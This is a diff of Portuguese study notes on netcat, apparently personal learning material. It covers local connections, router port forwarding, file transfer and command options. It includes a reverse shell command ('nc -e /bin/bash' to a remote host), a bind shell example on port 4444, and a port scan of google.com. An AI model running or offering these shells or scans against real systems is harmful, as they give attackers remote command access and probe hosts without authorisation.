@@ -8,15 +8,30 @@ NETCAT
 
 ____________________________________________________________________________________________________________________________________________
 
-SE CONECTANDO COM ALGUÉM QUE ESTÁ NA MESMA REDE QUE VOCÊ OU NÃO
+SE CONECTANDO COM ALGUÉM QUE ESTÁ NA MESMA REDE QUE VOCÊ
 
 -> NA MESMA REDE:
     -> é seguro
     -> é permitido pelo roteador
+    -> através do ip privado (dado pelo roteador) ou interno (em caso de loopback)
 
     pessoa 1: nc -lvp 9000 (vai ficar escutando através dessa porta)
     pessoa 2: nc 127.0.0.1 9000 (passa o end. de IP do outro computador e vai até essa porta desse computador)
 
+____________________________________________________________________________________________________________________________________________
+
+SE CONECTANDO COM ALGUÉM QUE ESTÁ EM UMA REDE DIFERENTE, QUE USA ROTEADOR
+
+-> Nesse caso, quem fornece o IP do computador é o próprio roteador.
+    -> Então, se alguém tentar usar o netcat para se conectar com um computador usando o seu IP público, ele irá bater no roteador
+    -> Portanto, precisa-se ir no roteador e configurar o NAT (network address translation)
+        -> mac: netstat -r (pega o endereço logo abaixo de gateway, que vai ser o do roteador)
+        -> digitar na guia o endereço do seu roteador: http://xxx.xxx.xxx.xxx
+        -> ir em virtual servers
+        -> colocar para a porta x (da sua escolha), quando entrar alguem, direcionar para o ip de um computador específico
+    -> agora, quando vc digitar o nc {ipDoComputador} {portConfigurada} (supondo que a porta está aberta pelo nc -l {port}), vai bater no ip
+    do roteador, que vai direcionar para o ip específico que foi configurado para ser direcionado caso alguém fosse escutar tal porta
+    
 ____________________________________________________________________________________________________________________________________________
 
 TRANSFERENCIA DE ARQUIVOS
@@ -36,3 +51,21 @@ SHELL REVERSA COM NETCAT
 -> nc -lvp 9000
 -> nc -e /bin/bash 255.255.255.255 9000 (pessoa está indo escutar)
     -> -e de executar e /bin/bash é o caminho do terminal
+
+____________________________________________________________________________________________________________________________________________
+
+OPÇÕES DE COMANDOS
+
+l -> listen
+v -> verbal output (mostra mais opções sobre o que está sendo feito pelo netcat, tipo status da conexão)
+e -> um executável será executado assim que uma pessoa entrar em conexão com você, que está escutando pela porta x.
+        -> ex: nc -l -p 4444 -e /bin/bash
+                   -> isso significa que quando alguém se conectar com seu ip e for pra porta 4444, o bash
+                   será executado no meu sistema e essa pessoa terá acesso ao meu terminal
+p -> opção usada para especificar a porta de destino da conexao
+u -> manda o netcat usar o protocolo udp ao invés de tcp
+w -> indica um timeout para a conexão (se não houver até certo tempo, netcat da um exit)
+z -> é usado para scannear portas abertas. permite checar se uma porta particular ou uma porta em um grupo de portas esta aberta ou nao
+        -> nc -zv google.com 1-80
+                 -> (o v é para um verbal output) vai procurar, nesse servidor, quais portas entre 1 e 80
+                      estão abertas
